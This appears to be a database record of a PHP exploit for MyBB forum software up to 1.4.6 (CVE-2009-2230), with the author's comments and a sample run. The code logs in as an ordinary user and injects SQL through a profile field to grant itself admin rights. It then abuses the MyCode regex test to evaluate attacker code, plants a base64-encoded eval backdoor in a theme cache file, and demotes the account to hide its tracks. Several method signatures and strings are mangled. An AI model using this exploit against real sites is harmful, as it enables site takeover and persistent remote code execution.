{
    "text": "vul_name : MyBB <= 1.4.6 Remote Code Execution Exploit ， vul_cve : CVE-2009-2230 ， vul_poc : <?PHP ， Someone decided to contact mybb's staff informing about this vulnerability with the obvious result that this will not work anymore. ， Fuc moron. ， I'm releasing a non-finished version of the exploit. No help , PoC and with the necessity of -admindir flag. ， Going to update it in the next days. ， For historical reason , i'm leaving the original title , but note that is <= 1.4.6 ， Example :  ， paradox @ d3b14n :  ~ /Files/Exploit-Pocs/My_Exploit/Remote/Mybb $ php myBBtomilw0rm.php -u anybody -p qwerty -t -admindir /admin/ ，  [ . ] Initialing. ，  [ + ] Logged in. ，  [ + ] my_post_key variable found. ，  [ + ] Turned On mybb's invisible mode. ，  [ + ] Sql code injected. You're now admin. ，  [ + ] Admindir found ( or -admindir is used )  : /admin/. ，  [ + ] Admin sid Found : 824e26b4221673a0f213c37f87b9ccd7 ，  [ + ] Site correctly backdoored. ，  [ + ] Sql code injected. You're now user. ，  [ + ] Backdoor URI :  ， All Done. The : Paradox hopes you used this exploit exclusively for your own fun and you enjoyed it. ， Have a nice day : P ， For the curious people :  ， Mybb <= 1.4.4 Remote Code Execution through Sql Injection Exploit ， Discovered : About 4 days before the exploit was coded. ， Coded : 03-03-2009 ， Author : The : Paradox ， Release : Not yet. ， No php.ini setting can stop us ! =O ， A user ( not email confirmed too ) is needed. ， Keep private or your keyboard will blew up. ，  $ mybb = new maibibi2 ;  ， class maibibi2 ， { ， { ，  $ this->user = $ this->get_argv ( '-u' )  ;  ，  $ this->pass = $ this->get_argv ( '-p' )  ;  ，  $ this->target = $ this->get_argv ( '-t' )  ;  ，  $ this->admindir = $ this->get_argv ( '-admindir' )  ;  ，  $ this->oa2u = $ this->get_argv ( '-onlyadmin2user' )  ;  ，  $ this->ip = '67.167.124.135' ;  ，  $ this->ua = 'Mozilla 5.0' ;  ，  $ this->bckdr = '/cache/themes/themes.php' ;  ，  $ this->http (  )  ;  ，  $ this->init (  )  ;  ， } ， { ， die ( \"Under Construction\\r\\n\" )  ;  ， } ， { ， global $ argv ;  ， } ， { ， set_time_limit ( 0 )  ; / about 30 seconds left? Be serious. ， echo \" [ . ] Initialing.\\r\\n\" ;  ， echo \" [ + ] Logged in.\\r\\n\" ;  ， echo \" [ + ] my_post_key variable found.\\r\\n\" ;  ，  $ this->hidemefromonlinelist (  )  ;  ， echo \" [ + ] Turned On mybb's invisible mode.\\r\\n\" ;  ，  $ this->user2admin (  )  ;  ， echo \" [ + ] Sql code injected. You're now admin.\\r\\n\" ;  ， echo \" [ + ] Admindir found ( or -admindir is used )  : { $ this->admindir}.\\r\\n\" ;  ， echo \" [ + ] Admin sid Found : { $ this->adminsid}\\r\\n\" ;  ，  #  $ this->writabledirs (  )  ;  ，  $ this->rce (  )  ;  ， echo \" [ + ] Site correctly backdoored.\\r\\n\" ;  ，  $ this->admin2user (  )  ;  ， echo \" [ + ] Sql code injected. You're now user.\\r\\n\" ;  ， echo \" [ + ] Backdoor URI : { $ this->target}{ $ this->bckdr}\\r\\n\" ;  ， echo \"All Done. The : Paradox hopes you used this exploit exclusively for your own fun and you enjoyed it.\\r\\nHave a nice day : P\\r\\n\\r\\n\" ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua )  ;  ，  $ this->postdata = array ( 'username' => $ this->user , 'password' => $ this->pass , 'submit' => 'Login' , 'action' => 'do_login' )  ;  ，  $ rsp = $ this->post ( \"{ $ this->target}/member.php\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'Referer' => \"{ $ this->target}/member.php\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; \" )  ;  ，  $ rsp = $ this->get ( \"{ $ this->target}/usercp.php?action=profile\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'Referer' => \"{ $ this->target}/usercp.php?action=profile\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; \" )  ;  ，  $ this->postdata = array ( 'my_post_key' => $ this->mypostkey , 'invisible' => '1' , 'action' => 'do_options' , 'regsubmit' => 'Update+Options' )  ;  ，  $ rsp = $ this->post ( \"{ $ this->target}/member.php\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'Referer' => \"{ $ this->target}/usercp.php?action=profile\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; \" )  ;  ，  $ this->postdata = array ( 'my_post_key' => $ this->mypostkey ,  ， 'invisible' => '1' ,  ， 'bday1' => ' ,  ， 'bday2' => ' ,  ， 'bday3' => ' ,  ， 'website' => 'http%3A%2F%2F' ,  ， 'profile_fields%5Bfid3%5D' => 'Undisclosed' ,  ， 'profile_fields%5Bfid2%5D' => 'Undisclosed' ,  ， 'profile_fields%5Bfid1%5D' => 'Undisclosed' ,  ， 'usertitle' => ' ,  ， 'icq' => ' ,  ， 'aim' => ' ,  ， 'msn' => ' ,  ， 'yahoo' => ' ,  ， 'away' => '0' ,  ， 'awayreason' => ' ,  ， 'awayday' => ' ,  ， 'awaymonth' => ' ,  ， 'awayyear' => ' ,  ， 'birthdayprivacy' => \"all' , usergroup=4 , email='pr3sident @ whit3house.gov' , regip='79.140.81.83' , longregip='1334595923' , lastip=' , longlastip='\" ,  ， 'action' => 'do_profile' ,  ， 'regsubmit' => '1' )  ;  ，  $ rsp = $ this->post ( \"{ $ this->target}/usercp.php\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'Referer' => \"{ $ this->target}/usercp.php?action=profile\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; \" )  ;  ，  $ rsp = $ this->get ( \"{ $ this->target}/index.php\" )  ;  ， &mdash ; <a href=\\\"{ $ this->target} ( .+? ) /index.php\\\"> ~ \" ,  $ rsp ,  $ res ) return False ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'Referer' => \"{ $ this->target}/usercp.php?action=profile\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; \" )  ;  ，  $ this->postdata = array ( 'username' => $ this->user , 'password' => $ this->pass , 'do' => 'login' )  ;  ，  $ rsp = $ this->post ( \"{ $ this->target}/{ $ this->admindir}/index.php\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'Referer' => \"{ $ this->target}/{ $ this->admindir}/index.php?\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; adminsid={ $ this->adminsid} ; \" )  ;  ，  $ this->get ( \"{ $ this->target}/{ $ this->admindir}/index.php?module=tools\" )  ;  ， } ， { ， /edits inc/functions.php ( original one )  ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'X-Requested-With' => 'XMLHttpRequest' , 'Referer' => \"{ $ this->target}/{ $ this->admindir}/index.php?module=config/mycode&action=edit&cid=1\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; adminsid={ $ this->adminsid} ; \" )  ;  ，  $ this->postdata = array ( 'my_post_key' => $ this->mypostkey ,  ， 'o_o' => 'phpinfo (  )  ; ' ,  ， 'regex' => ' ( . * %3F )  # e%00' ,  ， 'replacement' => 'die ( eval ( stripslashes (  $ _REQUEST [ \\'o_o\\' ]  )  ; ' ,  ， 'test_value' => 'XoD' )  ;  ，  $ rsp = $ this->post ( \"{ $ this->target}/{ $ this->admindir}/index.php?module=config/mycode&action=xmlhttp_test_mycode\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'X-Requested-With' => 'XMLHttpRequest' , 'Referer' => \"{ $ this->target}/{ $ this->admindir}/index.php?module=config/mycode&action=edit&cid=1\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; adminsid={ $ this->adminsid} ; \" )  ;  ，  $ this->postdata = array ( 'my_post_key' => $ this->mypostkey ,  ， 'o_o' => 'JGZwID0gZm9wZW4oJF9SRVFVRVNUWydmaWxlJ10sICdhJyk7DQpmd3JpdGUoJGZwLCAnPD9QSFAgaWYgKGlzc2V0KCRfUkVRVUVTVFt4XSkpIGV2YWwoc3RyaXBzbGFzaGVzKCRfUkVRVUVTVFt4XSkpOyA/PicpOw0KZmNsb3NlKCRmcCk7' ,  ， 'regex' => ' ( . * %3F )  # e%00' ,  ， 'replacement' => 'die ( eval ( base64_decode (  $ _REQUEST [ \\'o_o\\' ]  )  ; ' ,  ， 'test_value' => 'XoD' ,  ， 'file' => \"./{ $ this->bckdr}\" )  ;  ，  $ rsp = $ this->post ( \"{ $ this->target}/{ $ this->admindir}/index.php?module=config/mycode&action=xmlhttp_test_mycode\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'User-Agent' => $ this->ua , 'Referer' => \"{ $ this->target}/usercp.php?action=profile\" , 'Cookie' => \"mybbuser={ $ this->mybbuser} ; \" )  ;  ，  $ this->postdata = array ( 'my_post_key' => $ this->mypostkey ,  ， 'invisible' => '1' ,  ， 'bday1' => ' ,  ， 'bday2' => ' ,  ， 'bday3' => ' ,  ， 'website' => 'http%3A%2F%2F' ,  ， 'profile_fields%5Bfid3%5D' => 'Undisclosed' ,  ， 'profile_fields%5Bfid2%5D' => 'Undisclosed' ,  ， 'profile_fields%5Bfid1%5D' => 'Undisclosed' ,  ， 'usertitle' => ' ,  ， 'icq' => ' ,  ， 'aim' => ' ,  ， 'msn' => ' ,  ， 'yahoo' => ' ,  ， 'away' => '0' ,  ， 'awayreason' => ' ,  ， 'awayday' => ' ,  ， 'awaymonth' => ' ,  ， 'awayyear' => ' ,  ， 'birthdayprivacy' => \"all' , usergroup=2 , email='pr3sident.whit3house @ gmail.com' , regip='79.140.81.83' , longregip='1334595923' , lastip=' , longlastip='\" ,  ， 'action' => 'do_profile' ,  ， 'regsubmit' => '1' )  ;  ，  $ rsp = $ this->post ( \"{ $ this->target}/usercp.php\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'Cookie' => 'x=print \\'. : 31337 : .\\'%3B ; ' )  ;  ，  $ rsp = $ this->get ( \"{ $ this->target}/{ $ this->admindir}/inc/functions.php?\" )  ;  ， } ， { ，  $ this->header = array ( 'client-ip' => $ this->ip , 'Cookie' => 'x=print \\'. : 31337 : .\\'%3B ; ' )  ;  ，  $ rsp = $ this->get ( \"{ $ this->target}/{ $ this->bckdr}\" )  ;  ， } ， { ，  $ this->port = $ port ;  ，  $ this->timeout = $ timeout ;  ，  $ this->header = $ header ;  ，  $ this->postdata = $ post ;  ， } ， { ，  $ this->url = parse_url (  $ url )  ;  ，  $ this->packet = array (  )  ;  ，  $ this->packet [  ] = \"GET { $ this->url [ 'path' ] }?{ $ this->url [ 'query' ] }{ $ this->url [ 'fragment' ] } HTTP/1.1\" ;  ，  $ this->packet [  ] = \"Host : { $ this->url [ 'host' ] }\" ;  ， foreach (  $ this->header as $ header => $ value )  ， { ，  $ this->packet [  ] = \" $ header :  $ value\" ;  ， } ，  $ this->packet [  ] = \"\\r\\n\\r\\n\" ;  ，  $ this->packet = implode ( \"\\r\\n\" ,  $ this->packet )  ;  ， } ， { ，  $ this->url = parse_url (  $ url )  ;  ，  $ this->packet = array (  )  ;  ，  $ this->postcontent = ' ;  ，  $ this->packet [  ] = \"POST { $ this->url [ 'path' ] }?{ $ this->url [ 'query' ] }{ $ this->url [ 'fragment' ] } HTTP/1.1\" ;  ，  $ this->packet [  ] = \"Host : { $ this->url [ 'host' ] }\" ;  ， foreach (  $ this->header as $ header => $ value )  ， { ，  $ this->packet [  ] = \" $ header :  $ value\" ;  ， } ， foreach (  $ this->postdata as $ post => $ value )  ， { ，  $ this->postcontent .= \" $ post= $ value\" ;  ， } ，  $ this->packet [  ] = 'Content-Type : application/x-www-form-urlencoded' ;  ，  $ this->packet [  ] = \"Content-Length : \".strlen (  $ this->postcontent ) .\"\\r\\n\" ;  ，  $ this->packet [  ] = $ this->postcontent ;  ，  $ this->packet = implode ( \"\\r\\n\" ,  $ this->packet )  ;  ， } ， { ，  $ sk = fsockopen (  $ this->url [ 'host' ]  ,  $ this->url [ 'port' ]  ,  $ eno ,  $ estr ,  $ this->timeout )  ;  ， fputs (  $ sk ,  $ this->packet )  ;  ，  $ rsp = \" ;  ， { ，  $ rsp .= fgets (  $ sk , 1024 )  ;  ， } ， } ， fclose (  $ sk )  ;  ， } ， } ， ?>",
    "time": "2009.07.01"
}